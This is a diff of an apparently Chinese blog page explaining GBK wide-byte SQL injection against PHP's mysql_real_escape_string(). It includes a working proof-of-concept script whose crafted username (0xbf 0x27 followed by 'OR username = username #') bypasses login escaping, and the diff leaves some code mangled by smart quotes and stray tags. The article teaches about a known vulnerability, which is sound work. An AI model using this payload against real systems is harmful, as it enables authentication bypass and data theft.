@@ -154,49 +154,48 @@
 
 <p><span style="font-size: medium;">mysql_real_escape_string() 也存在相同的问题，只不过相比 addslashes() 它考虑到了用什么字符集来处理，因此可以用相应的字符集来处理字符。在MySQL 中有两种改变默认字符集的方法。</span></p>
 
-<p><pre><code class="bash">
-方法一：
+<pre><code>方法一：
 改变mysql配置文件my.cnf
 [client]
 default-character-set=GBK
 方法二：
 在建立连接时使用
-SET CHARACTER SET &lsquo;GBK&rsquo;
-例：mysql_query(&ldquo;SET CHARACTER SET &lsquo;gbk&rsquo;&rdquo;, $c);</p>
+SET CHARACTER SET 'GBK'
+例：mysql_query(&quot;SET CHARACTER SET 'gbk'&quot;, $c);
+</code></pre>
 
-<pre><code>
-&lt;span style=&quot;font-size: medium;&quot;&gt;问题是方法二在改变字符集时mysql_real_escape_string() 并不知道而使用默认字符集处理从而造成和 addslashes() 一样的漏洞&lt;/span&gt;
+<p><span style="font-size: medium;">问题是方法二在改变字符集时mysql_real_escape_string() 并不知道而使用默认字符集处理从而造成和 addslashes() 一样的漏洞</span></p>
 
-&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;
-&amp;lt;?php
+<p><pre><code class="php">
+&lt;?php</p>
 
-$c = mysql_connect(&quot;localhost&quot;, &quot;user&quot;, &quot;pass&quot;);
-mysql_select_db(&quot;database&quot;, $c);
+<p>$c = mysql_connect(&ldquo;localhost&rdquo;, &ldquo;user&rdquo;, &ldquo;pass&rdquo;);
+mysql_select_db(&ldquo;database&rdquo;, $c);</p>
 
-// change our character set
-mysql_query(&quot;SET CHARACTER SET 'gbk'&quot;, $c);
+<p>// change our character set
+mysql_query(&ldquo;SET CHARACTER SET &lsquo;gbk&rsquo;&rdquo;, $c);</p>
 
-// create demo table
-mysql_query(&quot;CREATE TABLE users (
+<p>// create demo table
+mysql_query(&ldquo;CREATE TABLE users (
     username VARCHAR(32) PRIMARY KEY,
     password VARCHAR(32)
-) CHARACTER SET 'GBK'&quot;, $c);
-mysql_query(&quot;INSERT INTO users VALUES('foo','bar'), ('baz','test')&quot;, $c);
+) CHARACTER SET &lsquo;GBK&rsquo;&ldquo;, $c);
+mysql_query(&ldquo;INSERT INTO users VALUES(&lsquo;foo&rsquo;,&lsquo;bar&rsquo;), (&lsquo;baz&rsquo;,&lsquo;test&rsquo;)&rdquo;, $c);</p>
 
-// now the exploit code
-$_POST['username'] = chr(0xbf) . chr(0x27) . ' OR username = username #'; 
-$_POST['password'] = 'anything'; 
+<p>// now the exploit code
+$_POST[&lsquo;username&rsquo;] = chr(0xbf) . chr(0x27) . &lsquo; OR username = username #&rsquo;;
+$_POST[&lsquo;password&rsquo;] = &lsquo;anything&rsquo;;</p>
 
-// Proper escaping, we should be safe, right?
-$user = mysql_real_escape_string($_POST['username'], $c);
-$passwd = mysql_real_escape_string($_POST['password'], $c);
+<p>// Proper escaping, we should be safe, right?
+$user = mysql_real_escape_string($_POST[&lsquo;username&rsquo;], $c);
+$passwd = mysql_real_escape_string($_POST[&lsquo;password&rsquo;], $c);</p>
 
-$sql = &quot;SELECT * FROM  users WHERE  username = '{$user}' AND password = '{$passwd}'&quot;;
+<p>$sql = &ldquo;SELECT * FROM  users WHERE  username = &lsquo;{$user}&rsquo; AND password = &lsquo;{$passwd}&rsquo;&ldquo;;
 $res = mysql_query($sql, $c);
-echo mysql_num_rows($res); // will print 2, indicating that we were able to fetch all records
+echo mysql_num_rows($res); // will print 2, indicating that we were able to fetch all records</p>
 
-?&amp;gt;
-</code></pre>
+<p>?&gt;
+```</p>
 
 <p><span style="font-size: medium;">环境PHP5.2</span><br />
 <span style="font-size: medium;">SQL:SELECT * FROM users WHERE username = &#8216;縗&#8217; OR username = username #&#8217; AND password = &#8216;anything&#8217;   查询结果为2</span></p>
